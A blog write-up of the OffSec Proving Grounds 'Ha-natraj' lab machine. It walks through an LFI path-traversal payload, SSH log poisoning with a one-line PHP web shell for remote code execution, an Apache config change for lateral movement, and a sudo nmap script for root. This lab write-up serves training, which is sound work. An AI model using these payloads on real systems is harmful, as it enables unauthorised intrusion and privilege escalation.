---
title: "Proving grounds Play: Ha-natraj"
layout: post
date: 2023-08-13 12:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- linux
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---
# Walkthough on Youtube

[![youtube](/assets/images/CTF/Pg-Play/Ha-natraj/yt.png)](https://youtu.be/dmGyq2Ny3ow)

## Nmap

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

## Fuzzing for directories and files

### Files
```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000069:   200        182 L    1767 W     14497 Ch    "index.html"      
000000171:   200        231 L    439 W      23358 Ch    "style.css"       
000000379:   200        182 L    1767 W     14497 Ch    "."
```

### Directories
```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000000002:   200        37 L     258 W      4949 Ch     "images"          
000001450:   200        16 L     60 W       942 Ch      "console"
```

![console dir](/assets/images/CTF/Pg-Play/Ha-natraj/console-dir.png)

### Parameter

`192.168.250.80/console/file.php?FUZZ=../../../../../../etc/passwd`

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload           
=====================================================================

000002206:   200        27 L     35 W       1398 Ch     "file"
```

## LFI Vulnerability

![LFI1](/assets/images/CTF/Pg-Play/Ha-natraj/lfi.png)

After a while doing fuzzing the authentication log file was successfully accessed through the LFI vulnerability.

![LFI2](/assets/images/CTF/Pg-Play/Ha-natraj/ssh-log1.png)

upon adding the below payload as part of authentication allows us to get remote code execution.

### Remote Code Execution

```text
hellofromnaveen/<?php system($_GET['cmd']); ?>
```

![RCE](/assets/images/CTF/Pg-Play/Ha-natraj/rce1.png)

**Reverse Shell Obtained**

![RCE](/assets/images/CTF/Pg-Play/Ha-natraj/rce2.png)

## Check for permissions

![RCE](/assets/images/CTF/Pg-Play/Ha-natraj/www-permissions.png)

The system level user can be obtained by running the apache service as system user.

## Privilege Escalation

- Change the user and group variable on the apache2 configuration file `/etc/apache2/apache2.conf` to `mahakal`.
- Restart the apache2 service, as the `www-data` have neccessary permission to `start, stop and restrat` the service.
- Use the same LFI technique to obtain reverse shell as `mahakal`

## Obtain root

- Check user `mahakal` executable persmissions using `sudo -l` command.
- Create a nmap script

```sh
echo 'os.execute("/bin/bash")' > exploit
```

- Run the script as sudo using nmap

```sh
sudo nmap --script=exploit
```

Root shell obtained.

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).